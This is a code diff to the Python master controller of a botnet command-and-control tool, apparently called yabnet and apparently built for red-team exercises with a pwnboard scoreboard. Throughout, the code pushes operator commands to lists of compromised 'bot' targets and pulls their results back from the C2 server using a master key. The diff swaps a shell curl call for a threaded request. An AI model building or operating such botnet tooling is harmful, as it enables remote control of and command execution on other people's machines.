@@ -11,6 +11,8 @@ import json
 import pathlib 
 import time
 import pandas as pd 
+from keyboard import press
+from colorama import Fore,Style
 from subprocess import Popen, PIPE
 from multiprocessing.pool import ThreadPool
 
@@ -22,6 +24,7 @@ import generator
 # Timer to check the agent's result. The golang agent calls back randomly between 30~40 seconds, so we check 
 # around the 43 second mark. Very janky, very hardcoding indeed. Hopefully I find a better way around this... 
 TIMER = '45'
+TIMER_INT = 45
 
 def refresh():
     while True:
@@ -31,19 +34,58 @@ def refresh():
         except Exception as e:
             pass 
         
-        time.sleep(45)
+        time.sleep(TIMER_INT)
+
+def print_green(string):
+    print(Fore.GREEN + string + Style.RESET_ALL)
+
+def print_blue(string):
+    print(Fore.BLUE + string + Style.RESET_ALL)
+
+def print_red(string):
+    print(Fore.RED + string + Style.RESET_ALL)
 
 def updatepwnboard(url):
     while True:
         pwnboardURL = url
         yabnetEndpoint = URL + '/updatepwnboard'
         try:
+            # Sending this request makes the thread to sleep for 63 seconds. ????????????????????????
             data = {'masterkey': MASTERKEY, 'pwnboardURL': pwnboardURL}
-            res = requests.post(yabnetEndpoint,data)
+            requests.post(yabnetEndpoint,data=data)
+
+            #DEBUG
+            #print(res.text)
         except Exception as e:
             print("[-] Master.py = " + e)
 
-        time.sleep(120)
+        # For some reason, this fucntion inside a thread sleeps 63 additional seconds. 
+        # So even though we sleep for 20 seconds, in total it sleeps for 83 seconds. WTF 
+        time.sleep(20)
+
+def checkPushResult(url, masterkey, target,cmd):
+    time.sleep(TIMER_INT)
+    endpoint = url + '/bot/' + target + '/result'
+    key = masterkey 
+
+    data = {'masterkey': key}
+    res = requests.post(endpoint, data=data)
+    
+    print_green("\n===========================================================================")
+    print_blue("[Target] " + str(target))
+    print_blue("[Command] " + cmd)
+    print_blue("[Result] \n")
+    print_green(res.text)
+    print_green("===========================================================================\n")
+
+    #self.poutput(output)
+
+    """
+                output_success = ansi.style('[+] Retrieved Master key = ' + MASTERKEY, fg='green', bold=True)
+            self.poutput(output_success
+    """
+    
+#url,MASTERKEY,target
 
 async def get_result(bot_ip):
     url = URL + '/bot/' + bot_ip + '/result'
@@ -221,10 +263,10 @@ ___  ___          _              _____                       _
             #print(df_string)
             #print(type(df_string))
 
-            printoutput = "\n ==================================================================\n"
+            printoutput = "\n ==============================================================================\n"
             printoutput += df_string
             printoutput += "\n" 
-            printoutput += " ==================================================================\n"
+            printoutput += " ===============================================================================\n"
 
             output_botlist = ansi.style(printoutput, fg='green', bold=True)
 
@@ -287,9 +329,7 @@ ___  ___          _              _____                       _
 
         # Push the command to multiple targets 
         for target in target_list:
-            print("[DEBUG] target = ", target)
-
-
+            #print("[DEBUG] target = ", target)
             url = URL + '/bot/' + target + '/push'
             masterkey = MASTERKEY
             cmd = args.command 
@@ -303,10 +343,19 @@ ___  ___          _              _____                       _
             self.poutput(res.text)
 
             # If command staging was successful, check the result page after TIMER.
+            # TODO: Make a thread here? But it failed last time so I have no idea...
             if 'result' in res.text:
                 # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
-                payload = "sleep " + TIMER + "; echo '\n[" + target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + target + "/result"
-                process = Popen(payload, shell=True)
+                #payload = "sleep " + TIMER + "; echo '\n[" + target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + target + "/result"
+                #process = Popen(payload, shell=True)
+                
+                pushThread = threading.Thread(target=checkPushResult, args=(URL,MASTERKEY,target,cmd,))
+                pushThread.daemon = True
+                pushThread.start()
+                
+                #pwnboardThread = threading.Thread(target=updatepwnboard, args=(url,))
+                #pwnboardThread.daemon = True
+                #pwnboardThread.start()
 
     """
     Command: reverse 
